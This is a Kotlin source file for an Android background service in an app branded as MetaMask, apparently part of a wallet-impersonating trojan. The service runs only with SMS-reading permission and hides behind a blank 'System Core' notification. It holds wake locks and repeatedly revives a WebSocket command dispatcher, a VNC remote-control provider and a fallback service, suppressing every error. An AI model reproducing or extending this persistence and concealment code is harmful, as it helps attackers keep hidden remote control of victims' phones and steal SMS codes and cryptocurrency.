package com.example.MetaMask.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequest
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.R
import com.example.MetaMask.receivers.AlarmReceiver
import kotlinx.coroutines.*

class PulseService : Service() {

    companion object {
        @Volatile private var vncWakePending = false
    }

    private val scope = CoroutineScope(Dispatchers.IO + Job())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[PulseService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        if (!startForegroundAsShort()) return START_NOT_STICKY

        try {
            getSharedPreferences("pulse_state", Context.MODE_PRIVATE)
                .edit().putLong("alive_ts", System.currentTimeMillis()).apply()
        } catch (_: Exception) {}

        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[PulseService] return") //xdbg
            return START_NOT_STICKY
        }

        val wakeLock = try {
            (getSystemService(Context.POWER_SERVICE) as PowerManager)
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MetaMask:PulseWakeLock")
                .also { it.acquire(10_000L) }
        } catch (_: Exception) { null }

        scope.launch {
            try {
                withTimeout(4_000L) {
                    wakeMainProcessViaContentProvider()
                    checkAndResurrectMaster()
                }
            } catch (_: kotlinx.coroutines.TimeoutCancellationException) {
                android.util.Log.e("XDBG", "[PulseService] catch (ignored)") //xdbg
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[PulseService] catch (ignored)") //xdbg
            } finally {
                try { if (wakeLock?.isHeld == true) wakeLock.release() } catch (_: Exception) {}
                stopSelf()
            }
        }

        android.util.Log.d("XDBG", "[PulseService] return") //xdbg
        return START_NOT_STICKY
    }

    private fun startForegroundAsShort(): Boolean {
        android.util.Log.d("XDBG", "[PulseService] startForegroundAsShort enter") //xdbg
        val channelId = "system_core_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (manager.getNotificationChannel(channelId) == null) {
                android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
                val channel = NotificationChannel(
                    channelId,
                    "System Core",
                    NotificationManager.IMPORTANCE_MIN
                )
                manager.createNotificationChannel(channel)
            }
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= 29) {
            android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
            try {
                ServiceCompat.startForeground(
                    this, 777, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
                android.util.Log.d("XDBG", "[PulseService] return") //xdbg
                return true
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[PulseService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                try {
                    startForeground(777, notification)
                    android.util.Log.d("XDBG", "[PulseService] return") //xdbg
                    return true
                } catch (_: Exception) {
                    android.util.Log.e("XDBG", "[PulseService] catch (ignored)") //xdbg
                    stopSelf()
                    android.util.Log.d("XDBG", "[PulseService] return") //xdbg
                    return false
                }
            }
        } else {
            try {
                startForeground(777, notification)
                android.util.Log.d("XDBG", "[PulseService] return") //xdbg
                return true
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[PulseService] catch (ignored)") //xdbg
                stopSelf()
                android.util.Log.d("XDBG", "[PulseService] return") //xdbg
                return false
            }
        }
    }

    private fun wakeMainProcessViaContentProvider() {
        android.util.Log.d("XDBG", "[PulseService] wakeMainProcessViaContentProvider enter") //xdbg
        Thread {
            try {
                @Suppress("DEPRECATION")
                val providers = packageManager.queryContentProviders(packageName, 0, 0)
                if (providers.isNullOrEmpty()) return@Thread
                val authority = providers.first().authority

                val uri = android.net.Uri.parse("content://$authority/health")
                contentResolver.query(uri, null, null, null, null)?.close()
            } catch (_: Exception) {}
        }.also { it.isDaemon = true; it.start() }
    }

    private fun checkAndResurrectMaster() {
        android.util.Log.d("XDBG", "[PulseService] checkAndResurrectMaster enter") //xdbg
        if (!MasterWebSocketDispatcher.IS_SERVICE_RUNNING) {
            android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
            var directStartSuccess = false
            val context = applicationContext

            try {
                val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                    putExtra("STARTED_FROM", "PULSE_CPR")
                }
                if (Build.VERSION.SDK_INT >= 26) {
                    android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
                    startForegroundService(masterIntent)
                } else {
                    startService(masterIntent)
                }
                directStartSuccess = true
            } catch (_: Exception) {}

            if (!directStartSuccess) {
                android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
                try {
                    val alarmIntent = Intent(context, AlarmReceiver::class.java)
                    context.sendBroadcast(alarmIntent)
                } catch (_: Exception) {}

                try {
                    val request = OneTimeWorkRequest.Builder(ServiceStarterWorker::class.java)
                        .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                        .addTag("PULSE_RECOVERY_JOB")
                        .build()
                    WorkManager.getInstance(context).enqueueUniqueWork("SS_ONCE", ExistingWorkPolicy.KEEP, request)
                } catch (_: Exception) {}
            }
        }

        if (!vncWakePending) {
            android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
            vncWakePending = true
            Thread {
                try {
                    val vncUri = android.net.Uri.parse("content://${packageName}.vnc_provider/wake")
                    contentResolver.query(vncUri, null, null, null, null)?.close()
                } catch (_: Exception) {
                    android.util.Log.e("XDBG", "[PulseService] catch (ignored)") //xdbg
                    try {
                        val craneIntent = Intent(applicationContext, CraneService::class.java)
                        if (Build.VERSION.SDK_INT >= 26) startForegroundService(craneIntent)
                        else startService(craneIntent)
                    } catch (_: Exception) {}
                } finally {
                    vncWakePending = false
                }
            }.also { it.isDaemon = true; it.start() }
        }
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[PulseService] onDestroy enter") //xdbg
        scope.cancel()
        super.onDestroy()
    }
}
